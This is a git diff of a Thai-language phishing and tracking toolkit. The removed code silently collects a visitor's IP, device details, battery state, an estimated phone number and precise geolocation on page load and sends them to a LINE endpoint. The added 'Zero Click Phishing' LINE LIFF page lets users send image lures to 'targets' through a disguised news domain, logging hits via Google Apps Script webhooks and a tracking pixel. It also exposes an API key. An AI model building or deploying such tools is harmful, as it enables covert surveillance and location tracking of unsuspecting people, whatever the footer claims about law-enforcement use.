@@ -1,906 +1,1118 @@
-// ฟังก์ชันดึง tracking key และcase name จากURLparameters
-function getUrlParameters() {
-  try {
-    const urlParams = new URLSearchParams(window.location.search);
-    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
-    const caseName = urlParams.get('case') || "ไม่มีค่า";
-    
-    console.log("ดึงค่าจาก URL parameters:");
-    console.log("- trackingKey:", trackingKey);
-    console.log("- caseName:", caseName);
-    
-    return {
-      trackingKey: trackingKey,
-      caseName: caseName
-    };
-  } catch (error) {
-    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
-    return {
-      trackingKey: "ไม่มีค่า",
-      caseName: "ไม่มีค่า"
-    };
-  }
-}
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero Click Phishing</title>
+    <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Line LIFF SDK -->
+    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Prompt', sans-serif;
+        }
+        body {
+            margin: 0;
+            padding: 16px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #00B900, #007700);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            display: flex; /* Added */
+            align-items: center; /* Added */
+            justify-content: center; /* Added */
+            gap: 10px; /* Added space between icon and text */
+        }
+        .header .header-icon { /* Added */
+            width: 28px;
+            height: 28px;
+            fill: white; /* Color the SVG icon white */
+        }
+        .header .header-text { /* Added */
+             text-align: left;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 700; /* Slightly bolder */
+        }
+        .header .subtitle {
+            font-size: 13px; /* Slightly smaller */
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        .content {
+            padding: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus {
+            border-color: #00B900;
+            outline: none;
+        }
+        .image-preview-container {
+            margin-top: 10px;
+            text-align: center;
+            border: 2px dashed #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fafafa;
+            transition: all 0.3s ease;
+        }
+        .image-preview-container:hover {
+            border-color: #00B900;
+            background-color: #f0f8f0;
+        }
+        .image-preview {
+            max-width: 100%;
+            max-height: 200px;
+            display: none;
+            margin-top: 10px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .btn {
+            display: inline-block;
+            background-color: #00B900;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-align: center;
+            width: 100%;
+            font-weight: 500;
+        }
+        .btn:hover {
+            background-color: #009900;
+        }
+        .btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .btn-file {
+            background-color: #666;
+            margin-bottom: 15px;
+        }
+        .btn-file:hover {
+            background-color: #555;
+        }
+        .btn-share {
+            margin-top: 20px;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            display: none;
+        }
+        .status.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .input-group {
+            display: flex;
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            flex: 1;
+            border-top-right-radius: 0;
+            border-bottom-right-radius: 0;
+        }
+        .input-group button {
+            border-top-left-radius: 0;
+            border-bottom-left-radius: 0;
+            padding: 0 15px;
+            background-color: #00B900;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .input-group button:hover {
+            background-color: #009900;
+        }
+        .input-group button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #888;
+            border-top: 1px solid #eee;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .loader-spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto;
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .tips {
+            background-color: #e9f7fe;
+            border-left: 4px solid #4fc3f7;
+            padding: 10px 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+        .tips p {
+            margin: 0;
+            color: #0277bd;
+        }
+        .user-info {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #eee;
+        }
+        .user-info .profile {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .user-info .profile-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 15px;
+            border: 2px solid #00B900;
+        }
+        .user-info .user-name {
+            font-weight: 500;
+            color: #333;
+            font-size: 16px;
+        }
+        .user-info .user-status {
+            font-size: 14px;
+            color: #00B900;
+            font-weight: 500;
+        }
+        .message-box {
+            background-color: #fff9e6;
+            border-left: 4px solid #ffc107;
+            padding: 10px 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .message-box p {
+            margin: 0;
+            color: #856404;
+            line-height: 1.5;
+        }
+        .message-box.error {
+            background-color: #f8d7da;
+            border-left: 4px solid #dc3545;
+        }
+        .message-box.error p {
+            color: #721c24;
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-left: 8px;
+        }
+        .badge.approved {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .badge.pending {
+            background-color: #fff3cd;
+            color: #856404;
+        }
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        #loadingScreen .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(0, 185, 0, 0.2);
+            border-top: 4px solid #00B900;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        #loadingScreen p {
+            color: #00B900;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen">
+        <div class="spinner"></div>
+        <p>กำลังตรวจสอบระบบ...</p>
+    </div>
 
-// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ1
-(function() {
-  // เก็บข้อมูลทั่วไป
-  const timestamp = new Date().toLocaleString('th-TH', {
-    timeZone: 'Asia/Bangkok',
-    year: 'numeric',
-    month: '2-digit',
-    day: '2-digit',
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit'
-  });
-  
-  // ดึง tracking key และ case name จาก URL
-  const { trackingKey, caseName } = getUrlParameters();
+    <div class="container">
+        <div class="header">
+             <!-- Added Eye Icon SVG -->
+             <svg class="header-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
+                 <path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/>
+             </svg>
+             <div class="header-text">
+                 <h1>Zero Click Phishing</h1>
+                 <div class="subtitle">สร้างรูปภาพส่งไปยังเป้าหมาย</div>
+             </div>
+        </div>
+        
+        <div class="content">
+            <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
+            <div class="user-info" id="userInfoSection" style="display: none;">
+                <div class="profile">
+                    <img id="profileImage" src="" alt="Profile" class="profile-img">
+                    <div>
+                        <div class="user-name" id="userName">User Name</div>
+                        <div class="user-status">
+                            สถานะ: <span id="userStatus">ตรวจสอบสิทธิ์...</span>
+                            <span id="statusBadge" class="badge">รอตรวจสอบ</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- ข้อความแนะนำหรือแจ้งเตือน -->
+            <div id="permissionMessage" class="message-box" style="display: none;">
+                <p>กรุณารอการอนุมัติจากผู้ดูแลระบบก่อนใช้งาน หากคุณยังไม่ได้ลงทะเบียน สามารถพิมพ์คำสั่ง <strong>#regis</strong> ในแชทส่วนตัวกับบอท</p>
+            </div>
+            
+            <!-- ฟอร์มหลัก -->
+            <div id="mainForm">
+                <div class="form-group">
+                    <label for="caseName">ชื่อเคส</label>
+                    <!-- Removed the input-group and button -->
+                    <input type="text" id="caseName" placeholder="ระบุชื่อเคส" required>
+                    <!-- <button id="generateTrackingBtn" title="สร้าง Tracking Key อัตโนมัติ">⚡</button> -->
+                </div>
+                
+                <div class="form-group">
+                    <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
+                    <button class="btn btn-file" id="selectImageBtn">เลือกรูปภาพ</button>
+                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                    <div class="image-preview-container">
+                        <img id="imagePreview" class="image-preview">
+                        <div id="uploadPrompt">คลิกเพื่อเลือกหรือลากรูปภาพมาที่นี่</div>
+                    </div>
+                </div>
+                
+                <div class="loader">
+                    <div class="loader-spinner"></div>
+                    <p>กำลังอัพโหลดรูปภาพ...</p>
+                </div>
+                
+                <div id="statusMessage" class="status"></div>
+                
+                <button class="btn btn-share" id="shareBtn" disabled>แชร์ภาพไปยังเป้าหมาย</button>
+                
+                <div class="tips">
+                    <p><strong>คำแนะนำ:</strong> รูปภาพควรมีขนาดเหมาะสม เพื่อการโหลดที่รวดเร็ว</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p style="color: red; font-weight: bold; margin-bottom: 10px;">⚠️ใช้เพื่อสืบสวนติดตามตัวผู้กระทำความผิดเพื่อมาดำเนินคดีตามกฎหมาย เท่านั่น!!!!</p>
+            &copy; 2025 Zero Click Phishing - Detective-X
+        </div>
+    </div>
 
-  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
-  const deviceInfo = getDetailedDeviceInfo();
-  const screenSize = `${window.screen.width}x${window.screen.height}`;
-  const screenColorDepth = window.screen.colorDepth;
-  const devicePixelRatio = window.devicePixelRatio || 1;
-  const referrer = document.referrer || "ไม่มีข้อมูล";
-  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
-  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
-  const connection = getConnectionInfo();
-  const browser = detectBrowser();
-
-  // ตรวจสอบการใช้งานแบตเตอรี่
-  getBatteryInfo().then(batteryData => {
-    // รวบรวมข้อมูลทั้งหมด
-    const allDeviceData = {
-      ...deviceInfo,
-      screenSize,
-      screenColorDepth,
-      devicePixelRatio,
-      language,
-      platform,
-      browser,
-      connection,
-      battery: batteryData
-    };
-
-    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
-    let dataToSend = {};
-    
-    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
-    Promise.all([
-      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
-      estimatePhoneNumber().catch(() => null)
-    ])
-    .then(([ipData, phoneInfo]) => {
-      // เก็บข้อมูลที่จำเป็นทั้งหมด
-      dataToSend = {
-        timestamp: timestamp,
-        ip: ipData,
-        deviceInfo: allDeviceData,
-        phoneInfo: phoneInfo,
-        referrer: referrer,
-        trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า",
-        useServerMessage: true,
-        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
-      };
-      
-      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
-      if (navigator.geolocation) {
-        const locationPromise = new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            position => {
-              resolve({
-                lat: position.coords.latitude,
-                long: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-              });
-            },
-            error => {
-              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
-              resolve("ไม่มีข้อมูล");
-            },
-            {
-              timeout: 5000,
-              enableHighAccuracy: true
-            }
-          );
+    <script>
+        // ตัวแปรสำหรับเก็บข้อมูล
+        let selectedImage = null;
+        let trackingKey = "";
+        let imageUrl = "";
+        let userId = "";
+        let displayName = "";
+        let pictureUrl = "";
+        let isLiffInitialized = false;
+        let userHasPermission = false;
+        
+        // ค่า Config สำคัญ
+        const LIFF_ID = '2007231851-0DqwXxQg'; // ใส่ LIFF ID ของคุณตรงนี้
+        const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657'; // ใส่ API keyของImgBB
+        
+        // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
+        const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwi-EDtyUxRFIjmfp2SiKhXDmkj0UZN8LUdG51bi0rBCt9DN2fBUZV0b65-gWSAkeY/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
+        const PIXEL_TRACKING_URL = 'https://script.google.com/macros/s/AKfycbwi-EDtyUxRFIjmfp2SiKhXDmkj0UZN8LUdG51bi0rBCt9DN2fBUZV0b65-gWSAkeY/exec'; // URL เดียวกับ PHISHING_WEBHOOK_URL
+        
+        // เริ่มต้นการทำงาน LIFF
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeLiff();
+            setupEventListeners();
         });
         
-        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
-        Promise.race([
-          locationPromise,
-          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
-        ])
-        .then(location => {
-          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
-          dataToSend.location = location;
-          
-          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
-          sendToLineNotify(dataToSend);
-        });
-      } else {
-        // ถ้าไม่สามารถใช้ Geolocation API ได้
-        dataToSend.location = "ไม่มีข้อมูล";
-        sendToLineNotify(dataToSend);
-      }
-    });
-  });
-})();
-
-// สร้าง ID เฉพาะสำหรับการร้องขอ
-function generateUniqueId() {
-  return Date.now().toString(36) + Math.random().toString(36).substr(2);
-}
-
-// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
-function getDetailedDeviceInfo() {
-  const userAgent = navigator.userAgent;
-  const vendor = navigator.vendor || "ไม่มีข้อมูล";
-  
-  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
-  let deviceType = "คอมพิวเตอร์"; // ค่าเริ่มต้น
-  let deviceModel = "ไม่สามารถระบุได้";
-  let osInfo = "ไม่สามารถระบุได้";
-  let deviceBrand = "ไม่สามารถระบุได้";
-  
-  // ตรวจจับ iPad อย่างถูกต้อง
-  const isIPad = detectIPad();
-  
-  // ตรวจจับ Device Type
-  if (isIPad) {
-    deviceType = "แท็บเล็ต";
-    deviceBrand = "Apple";
-    deviceModel = getIPadModel(userAgent);
-  } else if (/iPhone|iPod/.test(userAgent)) {
-    deviceType = "มือถือ";
-    deviceBrand = "Apple";
-    deviceModel = getIPhoneModel(userAgent);
-  } else if (/android/i.test(userAgent)) {
-    // แยกระหว่างแท็บเล็ตและมือถือ Android
-    if (/tablet|SM-T|Tab/i.test(userAgent) || (!/Mobile/i.test(userAgent) && Math.max(window.screen.width, window.screen.height) > 1000)) {
-      deviceType = "แท็บเล็ต";
-    } else {
-      deviceType = "มือถือ";
-    }
-    
-    // ดึงข้อมูลยี่ห้อและรุ่น Android
-    const androidInfo = getAndroidInfo(userAgent);
-    deviceBrand = androidInfo.brand;
-    deviceModel = androidInfo.model;
-    osInfo = androidInfo.osVersion;
-  } else {
-    // ตรวจจับ Desktop OS
-    if (/Windows/.test(userAgent)) {
-      deviceBrand = "PC";
-      osInfo = getWindowsVersion(userAgent);
-      deviceModel = `Windows ${osInfo}`;
-    } else if (/Mac OS X/.test(userAgent)) {
-      deviceBrand = "Apple";
-      osInfo = getMacOSVersion(userAgent);
-      deviceModel = `Mac ${osInfo}`;
-    } else if (/Linux/.test(userAgent)) {
-      deviceBrand = "PC";
-      deviceModel = "Linux";
-      if (/Ubuntu/.test(userAgent)) {
-        deviceModel = "Ubuntu Linux";
-      } else if (/Fedora/.test(userAgent)) {
-        deviceModel = "Fedora Linux";
-      }
-    } else if (/CrOS/.test(userAgent)) {
-      deviceBrand = "Google";
-      deviceModel = "Chromebook";
-      deviceType = "โน้ตบุ๊ค";
-    }
-  }
-  
-  // อัพเดทข้อมูล OS สำหรับอุปกรณ์ Apple ถ้ายังไม่ได้กำหนด
-  if (deviceBrand === "Apple" && osInfo === "ไม่สามารถระบุได้") {
-    if (isIPad || /iPhone|iPod/.test(userAgent)) {
-      osInfo = getIOSVersion(userAgent);
-    } else if (/Mac OS X/.test(userAgent)) {
-      osInfo = getMacOSVersion(userAgent);
-    }
-  }
-  
-  return {
-    userAgent: userAgent,
-    vendor: vendor,
-    deviceType: deviceType,
-    deviceModel: deviceModel,
-    osInfo: osInfo,
-    deviceBrand: deviceBrand
-  };
-}
-
-// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ (ป้องกันปัญหา iPadOS แสดงเป็น Mac)
-function detectIPad() {
-  const ua = navigator.userAgent;
-  
-  // วิธีการตรวจจับ iPad ที่แม่นยำมากขึ้น:
-  // 1. ตรวจสอบ User Agent แบบดั้งเดิมก่อน
-  if (/iPad/.test(ua)) {
-    return true;
-  }
-  
-  // 2. สำหรับ iPadOS 13+ ที่แสดงเป็น Mac Safari
-  // ตรวจสอบว่าเป็น Mac + มี Touch Support + ไม่มีตัวแปรเฉพาะของ Mac
-  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) {
-    // iPad รุ่นใหม่ใช้ iPadOS 13+ จะปลอมตัวเป็น macOS
-    return true;
-  }
-  
-  // 3. ตรวจสอบขนาดหน้าจอ สำหรับกรณีที่ไม่สามารถตรวจจับได้ด้วยวิธีอื่น
-  // iPad ทุกรุ่นมีอัตราส่วนจอที่เฉพาะและขนาดจอมักจะใหญ่กว่า iPhone
-  if (/Apple/.test(navigator.vendor) && 
-      /Mobile/.test(ua) && 
-      !(/iPhone|iPod/.test(ua)) && 
-      window.screen.width >= 768 && 
-      window.screen.height >= 768) {
-    return true;
-  }
-  
-  return false;
-}
-
-// ฟังก์ชันดึงข้อมูลรุ่น iPad
-function getIPadModel(ua) {
-  // ตรวจสอบรุ่น iPad จาก Build ID ใน User Agent
-  let model = "iPad";
-  const iosVersion = getIOSVersion(ua);
-  
-  // ตรวจสอบ CPU/Chip สำหรับรุ่นใหม่
-  if (/CPU OS 1[5-9]/.test(ua)) {
-    model += " (Apple Silicon)";
-  }
-  
-  // แยกแยะรุ่นตาม iPad identifier ใน UA ถ้ามี
-  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
-  if (modelMatch) {
-    // Match iPad model identifiers with actual models
-    const modelIdentifier = modelMatch[1];
-    switch (modelIdentifier) {
-      case "13,1": case "13,2": model = "iPad Air (4th gen)"; break;
-      case "13,4": case "13,5": case "13,6": case "13,7": model = "iPad Pro 11\" (3rd gen)"; break;
-      case "13,8": case "13,9": case "13,10": case "13,11": model = "iPad Pro 12.9\" (5th gen)"; break;
-      case "14,1": model = "iPad Pro 11\" (4th gen)"; break;
-      case "14,2": model = "iPad Pro 12.9\" (6th gen)"; break;
-      case "14,3": case "14,4": model = "iPad Air (5th gen)"; break;
-      // เพิ่มรายการอื่นๆ ตามต้องการ
-    }
-  } else {
-    // ถ้าไม่พบ identifier พยายามวิเคราะห์จาก OS version และขนาดจอ
-    const screenSize = Math.max(window.screen.width, window.screen.height);
-    if (screenSize >= 1024) {
-      model += " Pro";
-      if (screenSize >= 1366) {
-        model += " 12.9\"";
-      } else {
-        model += " 11\"";
-      }
-    } else if (screenSize >= 834) {
-      model += " Air/Pro 10.5\"";
-    } else {
-      model += "/mini";
-    }
-  }
-  
-  return `${model} (iOS ${iosVersion})`;
-}
-
-// ฟังก์ชันดึงข้อมูลรุ่น iPhone
-function getIPhoneModel(ua) {
-  let model = "iPhone";
-  const iosVersion = getIOSVersion(ua);
-  
-  // ตรวจสอบรุ่น iPhone จาก User Agent
-  if (/iPhone([0-9]+,[0-9]+)/.test(ua)) {
-    const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
-    const modelIdentifier = modelMatch[1];
-    // Match iPhone model identifiers with actual models
-    switch (modelIdentifier) {
-      case "15,4": case "15,5": model = "iPhone 14 Pro"; break;
-      case "15,2": case "15,3": model = "iPhone 14 Pro Max"; break;
-      case "14,7": model = "iPhone 14"; break;
-      case "14,8": model = "iPhone 14 Plus"; break;
-      case "13,1": model = "iPhone 12 mini"; break;
-      case "13,2": model = "iPhone 12"; break;
-      case "13,3": model = "iPhone 12 Pro"; break;
-      case "13,4": model = "iPhone 12 Pro Max"; break;
-      // เพิ่มรายการอื่นๆ ตามต้องการ
-      default: model = `iPhone (Model ID: ${modelIdentifier})`;
-    }
-  }
-  
-  return `${model} (iOS ${iosVersion})`;
-}
-
-// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
-function getAndroidInfo(ua) {
-  let brand = "Android";
-  let model = "ไม่ทราบรุ่น";
-  let osVersion = "ไม่ทราบเวอร์ชัน";
-  
-  // ดึงเวอร์ชัน Android
-  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
-  if (androidVersionMatch) {
-    osVersion = androidVersionMatch[1];
-  }
-  
-  // ตรวจสอบยี่ห้อและรุ่น
-  if (/Samsung|SM-|Galaxy/.test(ua)) {
-    brand = "Samsung";
-    const samsungModelMatch = ua.match(/SM-[A-Z0-9]+/i) || ua.match(/Galaxy\s[A-Z0-9\s]+/i);
-    if (samsungModelMatch) {
-      model = samsungModelMatch[0];
-      // แปลรหัสรุ่นให้เป็นชื่อรุ่นที่คนทั่วไปรู้จัก
-      if (model.startsWith("SM-")) {
-        if (model.startsWith("SM-G") || model.startsWith("SM-N")) {
-          if (model.startsWith("SM-G99")) model = "Galaxy S23 series";
-          else if (model.startsWith("SM-G98")) model = "Galaxy S21 series";
-          else if (model.startsWith("SM-G97")) model = "Galaxy S10 series";
-          else if (model.startsWith("SM-N9")) model = "Galaxy Note series";
-        } else if (model.startsWith("SM-A")) {
-          model = "Galaxy A series";
-        } else if (model.startsWith("SM-T")) {
-          model = "Galaxy Tab series";
+        // ฟังก์ชันเริ่มต้นการทำงาน LIFF
+        async function initializeLiff() {
+            try {
+                await liff.init({ liffId: LIFF_ID });
+                
+                if (!liff.isLoggedIn()) {
+                    liff.login();
+                    return;
+                }
+                
+                // ดึงข้อมูลโปรไฟล์ผู้ใช้
+                const profile = await liff.getProfile();
+                userId = profile.userId;
+                displayName = profile.displayName;
+                pictureUrl = profile.pictureUrl || 'https://via.placeholder.com/50';
+                
+                console.log(`ผู้ใช้: ${displayName} (${userId})`);
+                
+                // แสดงข้อมูลผู้ใช้
+                document.getElementById('userName').textContent = displayName;
+                document.getElementById('profileImage').src = pictureUrl;
+                document.getElementById('userInfoSection').style.display = 'block';
+                
+                // ตรวจสอบสิทธิ์ผู้ใช้
+                userHasPermission = await checkUserPermission(userId);
+                
+                if (userHasPermission) {
+                    // มีสิทธิ์ใช้งาน
+                    document.getElementById('userStatus').textContent = 'ได้รับอนุมัติแล้ว';
+                    document.getElementById('statusBadge').textContent = 'อนุมัติแล้ว';
+                    document.getElementById('statusBadge').className = 'badge approved';
+                    // เปิดใช้งานฟอร์ม
+                    enableForm();
+                } else {
+                    // ไม่มีสิทธิ์ใช้งาน
+                    document.getElementById('userStatus').textContent = 'รอการอนุมัติ';
+                    document.getElementById('statusBadge').textContent = 'รออนุมัติ';
+                    document.getElementById('statusBadge').className = 'badge pending';
+                    document.getElementById('permissionMessage').style.display = 'block';
+                    // ปิดใช้งานฟอร์ม
+                    disableForm();
+                }
+                
+                isLiffInitialized = true;
+                
+                // ตรวจสอบว่ามีพารามิเตอร์ caseName มาจาก URL หรือไม่
+                const urlParams = new URLSearchParams(window.location.search);
+                const caseNameParam = urlParams.get('case');
+                if (caseNameParam) {
+                    document.getElementById('caseName').value = caseNameParam;
+                }
+                
+                // ซ่อน Loading Screen
+                document.getElementById('loadingScreen').style.display = 'none';
+                
+            } catch (error) {
+                console.error('LIFF initialization failed', error);
+                showStatus('เกิดข้อผิดพลาดในการเริ่มต้น LIFF: ' + error.message, false);
+                document.getElementById('loadingScreen').style.display = 'none';
+            }
         }
-      }
-    }
-  } else if (/MI |Redmi|POCO/.test(ua)) {
-    brand = "Xiaomi";
-    const xiaomiModelMatch = ua.match(/MI\s[A-Z0-9]+|Redmi\s[A-Z0-9]+|POCO\s[A-Z0-9]+/i);
-    if (xiaomiModelMatch) {
-      model = xiaomiModelMatch[0];
-    }
-  } else if (/HUAWEI|HONOR/.test(ua)) {
-    brand = /HONOR/.test(ua) ? "HONOR" : "HUAWEI";
-    const huaweiModelMatch = ua.match(/HUAWEI\s[A-Z0-9\-]+|HONOR\s[A-Z0-9]+/i);
-    if (huaweiModelMatch) {
-      model = huaweiModelMatch[0];
-    }
-  } else if (/OPPO|CPH[0-9]+/.test(ua)) {
-    brand = "OPPO";
-    const oppoModelMatch = ua.match(/OPPO\s[A-Z0-9]+|CPH[0-9]+/i);
-    if (oppoModelMatch) {
-      model = oppoModelMatch[0];
-    }
-  } else if (/vivo/.test(ua)) {
-    brand = "vivo";
-    const vivoModelMatch = ua.match(/vivo\s[A-Z0-9]+/i);
-    if (vivoModelMatch) {
-      model = vivoModelMatch[0];
-    }
-  } else if (/ONEPLUS/.test(ua)) {
-    brand = "OnePlus";
-    const oneplusModelMatch = ua.match(/ONEPLUS\s[A-Z0-9]+/i);
-    if (oneplusModelMatch) {
-      model = oneplusModelMatch[0];
-    }
-  } else if (/Google|Pixel/.test(ua)) {
-    brand = "Google";
-    const pixelModelMatch = ua.match(/Pixel\s[0-9]+/i);
-    if (pixelModelMatch) {
-      model = pixelModelMatch[0];
-    }
-  } else {
-    // ถ้าไม่พบยี่ห้อที่รู้จัก พยายามดึงจาก Build info
-    const genericModelMatch = ua.match(/;\s([^;]+)\sBuild\//i) || ua.match(/;\s([^;]+)\)/i);
-    if (genericModelMatch) {
-      model = genericModelMatch[1].trim();
-      
-      // พยายามแยกยี่ห้อจากรุ่น
-      const brandParts = model.split(' ');
-      if (brandParts.length > 1) {
-        const possibleBrand = brandParts[0].toLowerCase();
-        if (!(/[0-9]/.test(possibleBrand))) {  // ถ้าไม่มีตัวเลขในชื่อยี่ห้อ
-          brand = brandParts[0];
-          model = model.substring(brand.length).trim();
+        
+        // ฟังก์ชันตรวจสอบสิทธิ์ผู้ใช้ (เรียกใช้ LineOA.html)
+        async function checkUserPermission(userId) {
+            try {
+                console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
+                
+                const response = await fetch(LINE_OA_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'checkUserPermission',
+                        userId: userId
+                    })
+                });
+                
+                try {
+                    // ตรวจสอบว่า response เป็น JSON หรือไม่
+                    const contentType = response.headers.get("content-type");
+                    if (contentType && contentType.includes("application/json")) {
+                        const data = await response.json();
+                        console.log("ผลการตรวจสอบสิทธิ์:", data);
+                        return data.hasPermission === true;
+                    } else {
+                        console.log("Server ไม่ได้ตอบกลับเป็น JSON, ใช้การตรวจสอบสำรอง");
+                        return checkUserPermissionFallback(userId);
+                    }
+                } catch (e) {
+                    console.error("ไม่สามารถแปลง response เป็น JSON:", e);
+                    return checkUserPermissionFallback(userId);
+                }
+            } catch (error) {
+                console.error('Error checking permission:', error);
+                // หากเกิดข้อผิดพลาดในการเชื่อมต่อ ให้ตรวจสอบจาก ID โดยตรง
+                return checkUserPermissionFallback(userId);
+            }
         }
-      }
-    }
-  }
-  
-  return {
-    brand: brand,
-    model: model,
-    osVersion: `Android ${osVersion}`
-  };
-}
-
-// ฟังก์ชันดึงเวอร์ชัน iOS
-function getIOSVersion(ua) {
